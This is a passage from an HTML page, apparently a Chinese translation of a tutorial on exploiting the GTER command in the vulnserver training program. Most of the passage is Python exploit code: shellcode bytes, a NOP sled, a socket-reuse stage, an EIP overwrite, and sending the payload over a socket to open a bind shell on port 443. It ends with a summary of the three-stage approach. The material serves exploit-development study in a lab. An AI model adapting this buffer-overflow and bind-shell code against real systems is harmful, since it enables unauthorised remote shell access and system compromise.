"\x95\x59\xbf\x63\xd3\x41\x68\x34\xb4\xb4\x61\xd0\x28"<br/>buf += "\xee\xdb\xc6\xb0\x76\x23\x42\x6f\x4b\xaa\x4b\xe2\xf7"<br/>buf += "\x88\x5b\x3a\xf7\x94\x0f\x92\xae\x42\xf9\x54\x19\x25"<br/>buf += "\x53\x0f\xf6\xef\x33\xd6\x34\x30\x45\xd7\x10\xc6\xa9"<br/>buf += "\x66\xcd\x9f\xd6\x47\x99\x17\xaf\xb5\x39\xd7\x7a\x7e"<br/>buf += "\x59\x3a\xae\x8b\xf2\xe3\x3b\x36\x9f\x13\x96\x75\xa6"<br/>buf += "\x97\x12\x06\x5d\x87\x57\x03\x19\x0f\x84\x79\x32\xfa"<br/>buf += "\xaa\x2e\x33\x2f"</span><span id="db53" class="nz jy it lw b gy os ob l oc od">payload = ""<br/>payload += vuln_command<br/>payload += "\x90" * 55             <strong class="lw iu"># Start location of jmp_back</strong><br/>payload += socket_reuse<br/>payload += "A" * (offset - 55 - len(socket_reuse))<br/>payload += eip<br/>payload += jmp_back<br/>payload += "C" * 40</span><span id="861d" class="nz jy it lw b gy os ob l oc od">print "[+] Sending buffer (Size: %d)" % len(payload)</span><span id="7b40" class="nz jy it lw b gy os ob l oc od">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(payload)</span><span id="e160" class="nz jy it lw b gy os ob l oc od">print "[+] Sent Socket_reuse Payload... Wait for 5 seconds..."</span><span id="5c59" class="nz jy it lw b gy os ob l oc od">time.sleep(5)<br/>s.send(buf + "\x90" * (512 - len(buf)))</span><span id="5ccd" class="nz jy it lw b gy os ob l oc od">print "[+] Bind Shell Payload Sent!"</span><span id="476a" class="nz jy it lw b gy os ob l oc od">s.close()</span></pre><p id="1668" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">一旦我们运行了<code class="fe lt lu lv lw b">final_gter.py</code>脚本，我们就可以成功地在端口443上打开bind shell。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi qe"><img src="../Images/6f2d11cb1105c87d9361d02de867cde4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*71e3FJgdHPdoQWprYpA5jg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">最终利用</figcaption></figure></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="6ada" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">结论</h1><p id="a188" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">概括一下:</p><ol class=""><li id="6684" class="mj mk it kx b ky mx lc my lg ne lk nf lo ng ls qf mp mq mr bi translated">我们模糊了vulnserver <code class="fe lt lu lv lw b">GTER</code>命令</li><li id="019f" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls qf mp mq mr bi translated">找到了<code class="fe lt lu lv lw b">GTER</code>有漏洞命令的入口点</li><li id="4a60" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls qf mp mq mr bi translated">找到控制<code class="fe lt lu lv lw b">EIP</code>覆盖的偏移量</li><li id="bdcc" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls qf mp mq mr bi translated">找到了<code class="fe lt lu lv lw b">JMP ESP</code>地址</li><li id="28cf" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls qf mp mq mr bi translated"><strong class="kx iu">【第一阶段外壳代码】</strong>引入第一阶段外壳代码，将JMP缩短到“A”s的更大空间之上</li><li id="b860" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls qf mp mq mr bi translated"><strong class="kx iu">【第二阶段shell code】</strong>接下来，由于缺乏空间来引入我们的有效载荷(如bind shell)，使用了Socket Reuse Exploit来找到足够的空间来放置我们的有效载荷。</li><li id="3ef8" class="mj mk it kx b ky ms lc mt lg mu lk mv lo mw ls qf mp mq mr bi translated"><strong class="kx iu">【第三阶段外壳代码】</strong>最后，引入了绑定外壳有效负载来获得外壳访问。</li></ol><p id="adaa" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">希望你也从中学到了一些东西。感谢阅读！</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi qg"><img src="../Images/1ba41bb3672e5a2562e4ef5f2bd721a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9hATqk6mG8pJAHvG.png"/></div></div></figure></div></div>    
</body>
</html>